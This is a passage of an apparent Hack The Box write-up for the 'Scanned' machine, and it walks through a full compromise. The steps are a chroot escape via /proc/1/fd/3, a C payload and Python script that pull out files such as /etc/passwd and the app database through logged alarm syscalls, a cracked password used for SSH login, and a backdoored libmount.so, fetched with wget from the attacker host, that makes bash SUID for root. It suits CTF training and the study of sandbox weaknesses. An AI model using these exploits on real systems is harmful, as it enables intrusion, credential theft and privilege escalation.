0;    syscall(SYS_capget, &amp;header, &amp;caps);    if (!(caps.effective &amp; 0x2401c0)) {        DIE(\"Insufficient capabilities\");    }}Next up in main a uuid is generated if no second argument is passed which would in turn take the place of the uuid.sandbox.c/generate_uuidvoid generate_uuid(char* buf) {    srand(time(0));    for (int i = 0; i &lt; 32; i+=2) {        sprintf(&amp;buf[i], \"%02hhx\", (char)(rand() % 255));    }}Before the program ends the make_jail function is called in main. First it checks if a file with the name of the uuid already exists in the jails directory, exits if it does and elses create a directory with the uuid as name. Afterwards it switches to the dirctory and calls copy_libs.sandbox.c/make_jailvoid make_jail(char* name, char* program) {    jailsfd = open(\"jails\", O_RDONLY|__O_DIRECTORY);    if (faccessat(jailsfd, name, F_OK, 0) == 0) {        DIE(\"Jail name exists\");    }    int result = mkdirat(jailsfd, name, 0771);    if (result == -1 &amp;&amp; errno != EEXIST) {        DIE( \"Could not create the jail\");    }    if (access(program, F_OK) != 0) {        DIE(\"Program does not exist\");    }    chdir(\"jails\");    chdir(name);    copy_libs();    do_namespaces();    copy(program, \"./userprog\");    if (chroot(\".\")) {DIE(\"Couldn't chroot #1\");}    if (setgid(1001)) {DIE(\"SGID\");}    if (setegid(1001)) {DIE(\"SEGID\");}    if (setuid(1001)) {DIE(\"SUID\");};    if (seteuid(1001)) {DIE(\"SEUID\");};    do_trace();    sleep(3);}Here a bin , usr/lib/x86_64-linux-gnu and  usr/lib64 directory get created. Next copy gets called to copy the the library and afterwards two symlinks are created for lib64 and lib respectively.sandbox.c/copy_libsvoid copy_libs() {    char* libs[] = {\"libc.so.6\", NULL};    char path[FILENAME_MAX] = {0};    char outpath[FILENAME_MAX] = {0};    system(\"mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin\");    for (int i = 0; libs[i] != NULL; i++) {        sprintf(path, \"/lib/x86_64-linux-gnu/%s\", libs[i]);        // sprintf(path, \"/lib/%s\", libs[i]);        sprintf(outpath, \"./usr/lib/%s\", libs[i]);        copy(path, outpath);    }    copy(\"/lib64/ld-linux-x86-64.so.2\", \"./usr/lib64/ld-linux-x86-64.so.2\");    system(\"ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin\");}Inside copy the actual copying of the library happens.copy.c// https://stackoverflow.com/questions/2180079/how-can-i-copy-a-file-on-unix-using-c#define _GNU_SOURCE#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;/* On versions of glibc &lt; 2.27, need to use syscall. * * To determine glibc version used by gcc, compute an integer representing the * version. The strides are chosen to allow enough space for two-digit * minor version and patch level. * */#define GCC_VERSION (__GNUC__*10000 + __GNUC_MINOR__*100 + __gnuc_patchlevel__)#if GCC_VERSION &lt; 22700static loff_t copy_file_range(int in, loff_t* off_in, int out,  loff_t* off_out, size_t s, unsigned int flags){  return syscall(__NR_copy_file_range, in, off_in, out, off_out, s,    flags);}#endifint copy(const char* src, const char* dst) {    int in, out;    struct stat stat;    loff_t s, n;    if(0&gt;(in = open(src, O_RDONLY))){        perror(\"open(src, ...)\");        exit(EXIT_FAILURE);    }    if(fstat(in, &amp;stat)){        perror(\"fstat(in, ...)\");        exit(EXIT_FAILURE);    }    s = stat.st_size;    if(0&gt;(out = open(dst, O_CREAT|O_WRONLY|O_TRUNC, 0777))){        perror(\"open(dst, ...)\");        exit(EXIT_FAILURE);    }    do{        if(1&gt;(n = copy_file_range(in, NULL, out, NULL, s, 0))){            perror(\"copy_file_range(...)\");            exit(EXIT_FAILURE);        }        s-=n;    }while(0&lt;s &amp;&amp; 0&lt;n);    close(in);    close(out);    return EXIT_SUCCESS;}Continuing with the execution flow in make_jail, do_namespaces is called next. This function creates a new namespace and unshares the pid and network space from the original namespace. Furthermore here a timer get’s set for the parent to exit after 6 seconds. Afterwards a /proc dirctory is created in ./jails/[uuid] and the actual /proc directory is mounted on top of it.sandbox.c/do_namespacesvoid do_namespaces() {    if (unshare(CLONE_NEWPID|CLONE_NEWNET) != 0) {DIE(\"Couldn't make namespaces\");};    // Create pid-1    if (fork() != 0) {sleep(6); exit(-1);}    mkdir(\"./proc\", 0555);    mount(\"/proc\", \"./proc\", \"proc\", 0, NULL);}After do_namespaces copy is called again to move the uploaded binary inside the chroot jail and the uid’s are set to 1001. Last up in make_jail, do_trace gets called. This function first drops the effective and permitted capabilities. Afterwards a child process is started which is killed after 5 seconds by another forked process which exits itself afterwards.sandbox.c/do_tracevoid do_trace() {    // We started with capabilities - we must reset the dumpable flag    // so that the child can be traced    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);    // Remove dangerous capabilities before the child starts    struct user_cap_header_struct header;    struct user_cap_data_struct caps;    char pad[32];    header.version = _LINUX_CAPABILITY_VERSION_3;    header.pid = 0;    caps.effective = caps.inheritable = caps.permitted = 0;    syscall(SYS_capget, &amp;header, &amp;caps);    caps.effective = 0;    caps.permitted = 0;    syscall(SYS_capset, &amp;header, &amp;caps);    int child = fork();    if (child == -1) {        DIE(\"Couldn't fork\");    }    if (child == 0) {        do_child();    }    int killer = fork();    if (killer == -1) {        DIE(\"Couldn't fork (2)\");    }    if (killer == 0) {        do_killer(child);    } else {        do_log(child);    }}Inside do_child the jailsfd is closed to lock the forked process inside ./jails/[uuid]. The interesting thing here is though that /proc is mounted inside the chroot jail and still provides means of accessing the rest of the filesystem.sandbox.c/do_childvoid do_child() {    // Prevent child process from escaping chroot    close(jailsfd);    prctl(PR_SET_PDEATHSIG, SIGHUP);    ptrace(PTRACE_TRACEME, 0, NULL, NULL);    char* args[] = {NULL};    execve(\"/userprog\", args, NULL);    DIE(\"Couldn't execute user program\");}After do_child a “killer” process is forked in do_killer which sleeps for 5 seconds, kills the do_child process and then exits.sandbox.c/do_killervoid do_killer(int pid) {    sleep(5);    if (kill(pid, SIGKILL) == -1) {DIE(\"Kill err\");}    puts(\"Killed subprocess\");    exit(0);}In do_log all the syscalls and their results are traced and passed to log_syscall.sandbox.c/do_logvoid do_log(int pid) {    int status;    waitpid(pid, &amp;status, 0);    struct user_regs_struct regs;    struct user_regs_struct regs2;    while (1) {        // Enter syscall        ptrace(PTRACE_SYSCALL, pid, 0, 0);        waitpid(pid, &amp;status, 0);        if (WIFEXITED(status) || WIFSIGNALED(status)) {            puts(\"Exited\");            return;        }        ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);        // Continue syscall        ptrace(PTRACE_SYSCALL, pid, 0, 0);        waitpid(pid, &amp;status, 0);        ptrace(PTRACE_GETREGS, pid, 0, &amp;regs2);        log_syscall(regs, regs2.rax);    }}typedef struct __attribute__((__packed__)) {    unsigned long rax;    unsigned long rdi;    unsigned long rsi;    unsigned long rdx;    unsigned long r10;    unsigned long r8;    unsigned long r9;    unsigned long ret;} registers;log_syscall now writes the traced syscalls to a log file /log.sandbox.c/log_syscallvoid log_syscall(struct user_regs_struct regs, unsigned long ret) {    registers result;    result.rax = regs.orig_rax;    result.rdi = regs.rdi;    result.rsi = regs.rsi;    result.rdx = regs.rdx;    result.r10 = regs.r10;    result.r8 = regs.r8;    result.r9 = regs.r9;    result.ret = ret;    int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777);    if (fd == -1) {        return;    }    write(fd, &amp;result, sizeof(registers));    close(fd);The log file now get’s rendered on the viewer route in django. Looking at malscanner/viewer/syscalls.py we can see a list of supported syscalls.malscanner/viewer/syscalls.py...[snip]...syscalls = [    [SyscallClass.Low, \"read\", 0, 3],    [SyscallClass.Low, \"write\", 1, 3],    [SyscallClass.Medium, \"open\", 2, 3],    [SyscallClass.Low, \"close\", 3, 1],    [SyscallClass.Medium, \"stat\", 4, 2],    [SyscallClass.Medium, \"fstat\", 5, 2],    [SyscallClass.Medium, \"lstat\", 6, 2],    [SyscallClass.Medium, \"access\", 21, 2],    [SyscallClass.Low, \"alarm\", 37, 1],    [SyscallClass.High, \"socket\", 41, 3],    [SyscallClass.High, \"connect\", 42, 3],    [SyscallClass.High, \"accept\", 43, 3],    [SyscallClass.High, \"shutdown\", 48, 2],    [SyscallClass.High, \"bind\", 49, 3],    [SyscallClass.High, \"listen\", 50, 2],    [SyscallClass.Medium, \"clone\", 56, 5],    [SyscallClass.Medium, \"fork\", 57, 0],    [SyscallClass.Medium, \"vfork\", 58, 0],    [SyscallClass.High, \"execve\", 59, 3],    [SyscallClass.High, \"kill\", 62, 2],    [SyscallClass.Medium, \"uname\", 63, 1],    [SyscallClass.Medium, \"getdents\", 78, 3],    [SyscallClass.Medium, \"getcwd\", 79, 2],    [SyscallClass.Medium, \"chdir\", 80, 1],    [SyscallClass.Medium, \"fchdir\", 81, 1],    [SyscallClass.High, \"rename\", 82, 2],    [SyscallClass.Low, \"mkdir\", 83, 2],    [SyscallClass.High, \"rmdir\", 84, 1],    [SyscallClass.High, \"unlink\", 87, 1],    [SyscallClass.Medium, \"chmod\", 90, 2],    [SyscallClass.Medium, \"fchmod\", 91, 2],    [SyscallClass.High, \"chown\", 92, 3],    [SyscallClass.High, \"fchown\", 93, 3],    [SyscallClass.High, \"ptrace\", 101, 4],]...[snip]...Since we are in a chroot jail and the PID + NET namepspace is unshared we have to think of another way to exploit the situation. One way to do this is the mounted /proc filesystem. Using PID 1, FD 3 and the ../ sequence we can traverse back outside of the chroot jail. Next we need a way to exfiltrate data from the system, which we can do using syscalls that in turn get logged and output on the website. To test our exfiltration we can first compile a small test binary with a string to exfiltrate. Multiple syscalls for this cause would be possible but we will use alarm in this case. Alarm takes an unsigned integer as input so we have to convert our char array. Since an unsigned integer is the size of 4 on linux systems the string test is just right for the first attempt. We convert the char pointer to an unsigned int pointer and run a syscall on the value (37 representing the alarm syscall).test.c#include \"unistd.h\"#include \"string.h\"int main (int argc, char *argv[]){  char* buf = \"test\";  unsigned int val = 0;  val = *((unsigned int *)(&amp;buf[0]));  syscall(37, val);  return 0;}After compiling the binary we upload it and after the sleep we get a result.$ gcc test.c -o testingConverting the hex back to ascii we see our exfiltration technique is working and we are getting back the string tset. The order here is reversed because it is a little endian system.$ echo -n '74736574' | xxd -r -ptsetSince we got exfiltration working we can next try to exfiltrate an actual file. Because we are running under the uid of 1001 we first choose a world readable one which also gives more information about the system like /etc/passwdexfil_passwd.c#include \"unistd.h\"#include \"fcntl.h\"int main (int argc, char *argv[]){  char buf[0x8];  int fd = open(\"/proc/1/fd/3/../../../../../../etc/passwd\", O_RDONLY);  while(read(fd, buf, 0x4) != 0)  {    unsigned int val = 0;    val = *((unsigned int*)(&amp;buf[0]));    syscall(37,val);  }  close(fd);  return 0;}Checking the first alarm it looks like it is working with toor being root in reverse.$ echo -n '746f6f72' | xxd -r -ptoorWe are now able to read files on the system but converting them manually and recompiling the binary would be very time consuming. This short python script will do the work for us here. it first fills in the file we want to read into C source code and compiles it. Then it uploads the binary to the malscanner, retrieves the response, parses it and saves the exfiltrated file on our system.import requestsimport uuidimport osimport sysfrom binascii import unhexlifyFILENAME = sys.argv[1]URL = 'http://10.129.159.163/scanner/upload/'C_CODE = f'''#include \"unistd.h\"#include \"fcntl.h\"int main (int argc, char *argv[]){  char buf[0x4];  int fd = open(\"{FILENAME}\", O_RDONLY);  while(read(fd, buf, 0x4) != 0)  {    unsigned int val = 0;    val = *((unsigned int *)(&amp;buf[0]));    syscall(37, val);  }  close(fd);  return 0;}'''guid_source = uuid.uuid4()guid_bin = uuid.uuid4()source = open(f'./{guid_source}.c', 'w')source.write(C_CODE)source.close()os.system(f'gcc ./{guid_source}.c -o {guid_bin}')multipart_form_data = {    'file': (f'{guid_bin}', open(f'./{guid_bin}', 'rb')),}r = requests.post(URL, files=multipart_form_data, allow_redirects=True)os.system(f'rm ./{guid_source}.c {guid_bin}')out = b''valid_lines = [line for line in r.text.split('\\n') if 'alarm(0x' in line]for line in valid_lines:    exfil = line.split('alarm(0x')[1].split(') = 0x')[0]    exfil = '0' * (8 - len(exfil)) + exfil    out += unhexlify(exfil)[::-1]save_out = open(FILENAME.replace('/', '_'), 'wb')save_out.write(out)save_out.close()Testing it with the /etc/passwd file again we can now comfortably retrieve it.$ python3 readfile.py '/proc/1/fd/3/../../../../../../etc/passwd'$ cat _proc_1_fd_3_.._.._.._.._.._.._etc_passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinclarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologinginLooking for possible interesting files on the system there is a malscanner.db in the webroot of the source code.$ ls malscannermalscanner     manage.py         sandbox  static     uploads       viewermalscanner.db  requirements.txt  scanner  templates  uwsgi_paramsThe end of the settings.py django configuration file leaks the root of the web application so we know where to look for the database.FILE_PATH = \"/var/www/malscanner/uploads\"SBX_PATH = \"/var/www/malscanner/sandbox\"Using our script we can retrieve the database and opening it there is a hash for the user clarence inside which also is a user on the os.$ python3 readfile.py '/proc/1/fd/3/../../../../../../var/www/malscanner/malscanner.db'$ sqlite3 _proc_1_fd_3_.._.._.._.._.._.._var_www_malscanner_malscanner.dbSQLite version 3.37.2 2022-01-06 13:25:41Enter \".help\" for usage hints.sqlite&gt; .tablesauth_group                  auth_user_user_permissionsauth_group_permissions      django_admin_logauth_permission             django_content_typeauth_user                   django_migrationsauth_user_groups            django_sessionsqlite&gt; select * from auth_user;1|md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf|2021-09-14 18:39:55.237074|1|clarence|||1|1|2021-09-14 18:36:46.227819|Using hashcat and rockyou we are able to crack it quite quickly.$ hashcat -m 20 -a 0 -O hash rockyou.txthashcat (v6.2.5) starting...[snip]...886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecryingSession..........: hashcatStatus...........: CrackedHash.Mode........: 20 (md5($salt.$pass))Hash.Target......: 9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752mTime.Started.....: Tue Feb  1 00:53:57 2022 (0 secs)Time.Estimated...: Tue Feb  1 00:53:57 2022 (0 secs)Kernel.Feature...: Optimized KernelGuess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 15539.8 kH/s (2.49ms) @ Accel:8192 Loops:1 Thr:32 Vec:1Recovered........: 1/1 (100.00%) DigestsProgress.........: 5243993/14344388 (36.56%)Rejected.........: 1113/5243993 (0.02%)Restore.Point....: 2622142/14344388 (18.28%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: yayavega -&gt; n11575yHardware.Mon.#1..: Temp: 41c Fan: 33% Util:  0% Core:1733MHz Mem:4006MHz Bus:16Started: Tue Feb  1 00:53:52 2022Stopped: Tue Feb  1 00:53:59 2022Testing the credentials clarence:onedayyoufeellikecrying with ssh we are able to log into the machine and grab the user flag.$ ssh clarence@10.129.159.163clarence@10.129.159.163's password:Linux scanned 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Jan 31 23:12:39 2022 from 10.10.14.73clarence@scanned:~$ wc -c user.txt33 user.txtRootWe noticed earlier that sandbox gets the cap_setuid set when compiling. This is also the case on this system. Furthermore there seemed to be interesting file permission on the copied libraries and on the whole jail directory itself.clarence@scanned:~$ /usr/sbin/getcap /var/www/malscanner/sandbox/sandbox/var/www/malscanner/sandbox/sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eipChecking on the system the directory is world readable. This means we can copy anything inside while we run a binary with sandbox. Since we are also able to access the rest of the filesystem through /proc/1/fd/3 we can run another binary from inside the sandbox. These two things mean we are able to make a binary on the host run with a backdoored library version.clarence@scanned:~$ ls -al /var/www/malscanner/sandbox/jails/total 8drwxrwxrwx 2 root root 4096 Jan 13 17:27 .drwxr-xr-x 3 root root 4096 Jan 13 17:27 ..Doing this with a suid binary we should be able to achieve code execution as root so the first step is to look at the suid binaries available on the system.clarence@scanned:~$ find / -perm -4000 2&gt;/dev/null/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/chsh/usr/bin/su/usr/bin/fusermount/usr/bin/passwd/usr/bin/sudo/usr/bin/mount/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chfn/usr/bin/umountIn this case we choose mount as our target. Using ldd we can see all the libraries it imports.clarence@scanned:/var/www/malscanner/sandbox$ ldd /usr/bin/mount        linux-vdso.so.1 (0x00007ffe1d1f2000)        libmount.so.1 =&gt; /lib/x86_64-linux-gnu/libmount.so.1 (0x00007f0af75d4000)        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0af740f000)        libblkid.so.1 =&gt; /lib/x86_64-linux-gnu/libblkid.so.1 (0x00007f0af73be000)        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f0af7392000)        /lib64/ld-linux-x86-64.so.2 (0x00007f0af7647000)        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f0af72fa000)        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0af72f4000)        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f0af72d0000)To choose the one we want to backdoor we can run mount from within the sandbox and look at the error message to get the first library missing. To have an interactive process from where we can call mount one way is to run sandbox with /bin/shclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 1$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp/proc/1/fd/3/../../../../../../usr/bin/mount: error while loading shared libraries: libmount.so.1: cannot open shared object file: No such file or directory$ Killed subprocessHaving identified the library to backdoor we now need to know all the functions inside it. To have better access to it we use scp to copy the library over to our machine.$ scp clarence@10.129.160.252:/lib/x86_64-linux-gnu/libmount.so.1 .clarence@10.129.160.252's password:libmount.so.1                                                                                                                                                                                                100%  367KB 225.1KB/s   00:01$Using objdump we can retrieve all the functions and with awk we can create a C source file calling each one of them. For the function call we will simply output which function got called so we know what to backdoor.$ objdump -T libmount.so.1  | grep 'DF .text'  | awk -F' ' '{print\"int \" $7\"() { puts(\\\"\"$7\" got called !!\\\"); return 0; }\"}' &gt; evillib.cFinally we also add the necessary header files at the top of the source code and compile it to a shared library.evillib.c#include \"stdio.h\"#include \"stdlib.h\"int mnt_context_prepare_mount() { puts(\"mnt_context_prepare_mount got called !!\"); return 0; }int mnt_context_syscall_called() { puts(\"mnt_context_syscall_called got called !!\"); return 0; }int mnt_table_set_trailing_comment() { puts(\"mnt_table_set_trailing_comment got called !!\"); return 0; }int mnt_context_get_target() { puts(\"mnt_context_get_target got called !!\"); return 0; }int mnt_fs_get_size() { puts(\"mnt_fs_get_size got called !!\"); return 0; }int mnt_table_get_trailing_comment() { puts(\"mnt_table_get_trailing_comment got called !!\"); return 0; }int mnt_get_fstype() { puts(\"mnt_get_fstype got called !!\"); return 0; }int mnt_resolve_spec() { puts(\"mnt_resolve_spec got called !!\"); return 0; }...[snip]...\tint mnt_context_disable_mtab() { puts(\"mnt_context_disable_mtab got called !!\"); return 0; }int mnt_fs_get_target() { puts(\"mnt_fs_get_target got called !!\"); return 0; }int mnt_update_get_mflags() { puts(\"mnt_update_get_mflags got called !!\"); return 0; }int mnt_table_parse_swaps() { puts(\"mnt_table_parse_swaps got called !!\"); return 0; }int mnt_context_set_target_ns() { puts(\"mnt_context_set_target_ns got called !!\"); return 0; }int mnt_table_parse_stream() { puts(\"mnt_table_parse_stream got called !!\"); return 0; }int mnt_update_get_filename() { puts(\"mnt_update_get_filename got called !!\"); return 0; }int mnt_table_last_fs() { puts(\"mnt_table_last_fs got called !!\"); return 0; }int mnt_split_optstr() { puts(\"mnt_split_optstr got called !!\"); return 0; }int mnt_context_get_fstype() { puts(\"mnt_context_get_fstype got called !!\"); return 0; }$ gcc -shared -fPIC -o evillib.so evillib.cNext we transfer it over to the machine and prepare the command to execute in sh to just paste it later since we are dealing with a limited timeframe.clarence@scanned:/var/www/malscanner/sandbox$ wget 10.10.14.75:8000/evillib.so -O /tmp/evillib.so--2022-02-02 20:41:40--  http://10.10.14.75:8000/evillib.soConnecting to 10.10.14.75:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 69752 (68K) [application/octet-stream]Saving to: ‘/tmp/evillib.so’/tmp/evillib.so                                             100%[==========================================================================================================================================&gt;]  68.12K  --.-KB/s    in 0.09s2022-02-02 20:41:40 (755 KB/s) - ‘/tmp/evillib.so’ saved [69752/69752]For the execution we open up another ssh session where we will prepare the copying of the bad library. First we create a variable to hold the uuid for our jail. We do this to keep track which jail names are already blocked currently. Next is a sleep command so we can start the sandbox during the sleep and then the backdoored library gets copied into the created jail.clarence@scanned:/var/www/malscanner/sandbox$ UNIQUE=1; sleep 2; cp /tmp/evillib.so /var/www/malscanner/sandbox/jails/$UNIQUE/lib/libmount.so.1After we start the command with the sleep we run /bin/sh inside sandbox on our other ssh session specifying the same uuid.clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 1$Once the copy command finishes we run our prepared mount command inside the sandbox’s /bin/sh. There are some errors about no version information being available but at the end of the output we see that mnt_init_debug and mnt_new_context got called by mount.$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)mnt_init_debug got called !!mnt_new_context got called !!mount: libmount context allocation failed: Success$ Killed subprocessExitedSince mnt_init_debug got called first we will choose this function to run our code. All it does is set the uid to 0, confirms it got set and the gives bash the suid bit on the system.#include \"stdio.h\"#include \"stdlib.h\"...[snip]...\tint mnt_init_debug() { puts(\"mnt_init_debug got called !!\"); setuid(0); printf(\"uid %d\\n\", getuid()); system(\"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash\"); return 0; }...[snip]...\tNow all we have to do is perform the steps from before. First we compile the library again and transfer it over to the target.gcc -shared -fPIC -o evillib.so evillib.cevillib.c: In function ‘mnt_init_debug’:evillib.c:19:62: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]   19 | int mnt_init_debug() { puts(\"mnt_init_debug got called !!\"); setuid(0); printf(\"uid %d\\n\", getuid()); system(\"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash\"); return 0; }      |                                                              ^~~~~~evillib.c:19:92: warning: implicit declaration of function ‘getuid’ [-Wimplicit-function-declaration]   19 | int mnt_init_debug() { puts(\"mnt_init_debug got called !!\"); setuid(0); printf(\"uid %d\\n\", getuid()); system(\"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash\"); return 0; }clarence@scanned:/var/www/malscanner/sandbox$ rm /tmp/evillib.soclarence@scanned:/var/www/malscanner/sandbox$ wget 10.10.14.75:8000/evillib.so -O /tmp/evillib.so--2022-02-02 20:47:30--  http://10.10.14.75:8000/evillib.soConnecting to 10.10.14.75:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 69960 (68K) [application/octet-stream]Saving to: ‘/tmp/evillib.so’/tmp/evillib.so                                             100%[==========================================================================================================================================&gt;]  68.32K  --.-KB/s    in 0.09s2022-02-02 20:47:30 (754 KB/s) - ‘/tmp/evillib.so’ saved [69960/69960]We increment our uuid value so sandbox does not exit because the jail name exits. Then we run the sleep command first again and start /bin/sh in the sandbox with the incremented uuid.clarence@scanned:/var/www/malscanner/sandbox$ UNIQUE=2; sleep 2; cp /tmp/evillib.so /var/www/malscanner/sandbox/jails/$UNIQUE/lib/libmount.so.1Like before we run our prepared mount statement inside the sandbox again after the copy command finished. In the output we can see that the uid of the process running our function is now 0, indicating our backdoored code got executed successfully.clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 2$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)mnt_init_debug got called !!uid 0mnt_new_context got called !!mount: libmount context allocation failed: Success$ Killed subprocessExitedNow we can simply drop into a root bash shell and add the root flag to our collection.clarence@scanned:/var/www/malscanner/sandbox$ bash -pbash-5.1# wc -c /root/root.txt33 /root/root.txt"
  },
  
  {
    "title": "Hack The Box - Paper",
    "url": "/posts/paper/",
    "categories": "HackTheBox",
    "tags": "linux, easy, wordpress, rocket chat, cve, lfi, unintended, pkexec, polkit",
    "date": "2022-06-18 00:00:00 +0800",
    





    
    "snippet": "UserPaper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installa...",
